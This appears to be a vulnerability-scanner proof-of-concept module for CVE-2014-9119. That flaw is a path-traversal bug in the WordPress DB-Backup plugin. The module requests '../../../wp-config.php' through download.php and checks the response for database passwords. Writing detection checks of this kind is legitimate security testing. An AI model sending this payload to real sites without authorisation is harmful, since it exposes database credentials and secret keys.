# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib2

class Vuln(ABVuln):
    vuln_id = 'WordPress_0024' # 平台漏洞编号，留空
    name = 'WordPress DB-Backup Plugin 4.5 /download.php 任意文件下载漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD # 漏洞类型
    disclosure_date = '2014-11-26'  # 漏洞公布时间
    desc = '''
        DB Backup plugin for WordPress contains a flaw that allows traversing outside of
        a restricted path. The issue is due to the download.php script not properly
        sanitizing user input, specifically path traversal style attacks (e.g. '../').
        With a specially crafted request, a remote attacker can gain read access to
        arbitrary files, limited by system operational access control. This
        vulnerability can be used to get WordPress authentication keys and salts,
        database address and credentials, which can be used in certain environments to
        elevate privileges and execute malicious PHP code.
        Root cause:
        Unsanitized user input to readfile() function.
    '''  # 漏洞描述
    ref = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-9119'  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = 'CVE-2014-9119'  # cve编号
    product = 'WordPress DB-Backup Plugin'  # 漏洞应用名称
    product_version = '4.5'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'ced5c830-8c05-413b-ad41-a67895af73c8'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            payload = '/wp-content/plugins/db-backup/download.php?file=../../../wp-config.php'
            verify_url = self.target + payload
            req = urllib2.Request(verify_url)
            content = urllib2.urlopen(req).read()
            
            if 'DB_PASSWORD' in content and 'wp-settings.php' in content:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
